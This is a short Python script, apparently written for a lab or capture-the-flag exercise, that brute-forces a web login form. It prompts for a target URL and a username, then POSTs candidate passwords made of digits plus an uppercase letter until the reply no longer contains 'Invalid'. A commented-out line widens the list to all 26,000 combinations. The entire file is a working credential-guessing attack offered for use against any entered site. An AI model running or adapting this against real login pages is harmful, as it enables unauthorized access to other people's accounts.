import requests
print('\n')
print('*'*100)
print("Syntax : https://<domain/path/login.php index.php...etc>")
print('*'*100)
target = input(str("Enter the target : "))
username = input(str("Enter the username : "))

password_lst = [str(i).zfill(3)+chr(j) for i in range(111,112) for j in range (65,91)]
#password_lst = [f"{str(i).zfill(3)}{chr(j)}" for i in range(1000) for j in range(65, 91)]

def brute_force():
    for passwd in password_lst:
        data = {"username":username,"password":passwd}

        response = requests.post(target, data=data)

        if "Invalid" not in response.text:
            print (f"[*] Found Credentials : {username} : {passwd}")
            break
        else:
            print(f"Tried credentials {username} : {passwd}" )
brute_force()